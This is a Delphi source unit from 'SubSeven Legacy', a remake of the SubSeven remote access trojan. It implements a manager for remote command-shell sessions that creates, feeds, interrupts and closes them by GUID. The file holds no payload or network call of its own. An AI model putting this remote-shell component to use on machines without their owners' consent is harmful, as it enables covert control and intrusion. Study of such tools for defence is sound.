{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit Sub7.Core.Shell.Emulator;

interface

uses System.Classes, Winapi.Windows, Generics.Collections, Sub7.Core.Shell.Event,
     Sub7.Core.Shell.Thread.Instance;

type
  TS7Shell = class
  private
    FQueue : TThreadedQueue<TS7ShellEvent>;
    FPool  : TObjectDictionary<String, TS7ShellProc>;
  public
    {@C}
    constructor Create();
    destructor Destroy(); override;

    {@M}
    function New() : String;
    procedure Delete(const AGUID : String);

    procedure Write(const AGUID : String; AValue : AnsiString);
    procedure Break(const AGUID : String);
    procedure Close(const AGUID : String);

    {@G}
    property Queue : TThreadedQueue<TS7ShellEvent> read FQueue;
  end;

implementation

uses System.SysUtils, Sub7.Core.Utils, Sub7.Core.Bundle, Sub7.Core.Exceptions,
     Sub7.Core.Diagnostic;

{-------------------------------------------------------------------------------
  ___constructor
-------------------------------------------------------------------------------}
constructor TS7Shell.Create();
begin
  FQueue := TThreadedQueue<TS7ShellEvent>.Create(10, INFINITE, 1);
  FPool  := TObjectDictionary<String, TS7ShellProc>.Create([doOwnsValues]);
end;

{-------------------------------------------------------------------------------
  ___destructor
-------------------------------------------------------------------------------}
destructor TS7Shell.Destroy();
begin
  { It is very important to shutdown the queue before terminating our pool of
    threads otherwise we might freeze }
  if Assigned(FQueue) then
    FQueue.DoShutDown();

  if Assigned(FPool) then
    FreeAndNil(FPool);

  if Assigned(FQueue) then
    FreeAndNil(FQueue);

  ///
  inherited Destroy();
end;

{-------------------------------------------------------------------------------
  ___new
-------------------------------------------------------------------------------}
function TS7Shell.New() : String;
var AGUID : String;
begin
  AGUID := TGUID.NewGuid.ToString;

  FPool.Add(AGUID, TS7ShellProc.Create(AGUID, FQueue));

  ///
  result := AGUID;
end;

{-------------------------------------------------------------------------------
  ___delete
-------------------------------------------------------------------------------}
procedure TS7Shell.Delete(const AGUID : String);
var AShellProc : TS7ShellProc;
begin
  FPool.Remove(AGUID);
end;

{-------------------------------------------------------------------------------
  Write data to defined shell
-------------------------------------------------------------------------------}
procedure TS7Shell.Write(const AGUID : String; AValue : AnsiString);
var AShellProc : TS7ShellProc;
begin
  if not FPool.TryGetValue(AGUID, AShellProc) then
    raise ES7Exception.Create(ERR_GUID);
  ///

  AShellProc.PostShellCommand(AValue);
end;

{-------------------------------------------------------------------------------
  Send CTRL+C / Break to Shell
-------------------------------------------------------------------------------}
procedure TS7Shell.Break(const AGUID : String);
var AShellProc : TS7ShellProc;
begin
  if not FPool.TryGetValue(AGUID, AShellProc) then
    raise ES7Exception.Create(ERR_GUID);
  ///

  AShellProc.PostBreak();
end;

{ TS7Shell.Break

  End shell session by killing attached process }
procedure TS7Shell.Close(const AGUID : String);
var AShellProc : TS7ShellProc;
begin
  if not FPool.TryGetValue(AGUID, AShellProc) then
    raise ES7Exception.Create(ERR_GUID);
  ///

  AShellProc.PostClose();
end;

end.

